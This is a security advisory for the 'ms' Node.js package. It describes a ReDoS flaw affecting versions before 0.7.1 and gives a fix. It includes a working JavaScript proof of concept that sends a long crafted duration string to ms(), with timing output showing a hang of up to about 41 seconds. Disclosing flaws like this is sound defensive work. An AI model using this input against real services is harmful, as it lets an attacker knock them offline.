### Summary
*Regular Expression Denial of Service*<br><br>Recommendation: Update to version 0.7.1 or greater. An alternative would be to limit the input length of the user input before passing it into ms.
### Details
ms is vulnerable to regular expression denial of service (ReDoS) when extremely long version strings are parsed.  "The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time."[1]  ### Proof of Concept ``` var ms = require('ms'); var genstr = function (len, chr) {    var result = "";    for (i=0; i<=len; i++) {        result = result + chr;    }     return result; }  ms(genstr(process.argv[2], "5") + " minutea");  ```  ### Results Showing increase in execution time based on the input string. ``` $ time node ms.js 10000  real	0m0.758s user	0m0.724s sys	0m0.031s  $ time node ms.js 20000  real	0m2.580s user	0m2.494s sys	0m0.047s  $ time node ms.js 30000  real	0m5.747s user	0m5.483s sys	0m0.080s  $ time node ms.js 80000  real	0m41.022s user	0m38.894s sys	0m0.529s ```
